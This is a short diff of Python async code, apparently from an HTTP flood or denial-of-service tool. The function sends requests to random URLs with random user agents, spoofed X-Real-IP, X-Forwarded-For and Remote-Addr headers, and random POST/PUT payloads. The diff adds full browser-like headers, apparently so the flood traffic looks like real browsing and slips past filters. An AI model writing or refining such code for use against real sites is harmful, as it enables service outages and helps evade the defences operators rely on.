@@ -31,7 +31,18 @@ def generate_random_url():
     return f"{dependency_url}{random_suffix}"
 
 async def download_dependency(client, method, url, stats, no_response):
-    headers = {"User-Agent": generate_random_user_agent(), "X-Real-IP": generate_random_ip(), "X-Forwarded-For": generate_random_ip(), "Remote-Addr": generate_random_ip()}
+    headers = {  
+    "User-Agent": generate_random_user_agent(),  
+    "X-Real-IP": generate_random_ip(),  
+    "X-Forwarded-For": generate_random_ip(),  
+    "Remote-Addr": generate_random_ip(),  
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",  
+    "Accept-Encoding": "gzip, deflate, br",  
+    "Accept-Language": "en-US,en;q=0.9",  
+    "Connection": "keep-alive",  
+    "Upgrade-Insecure-Requests": "1",  
+    "Cache-Control": "max-age=0"
+}
     payload = generate_random_payload() if method in ["POST", "PUT"] else None
     try:
         if method == "GET":
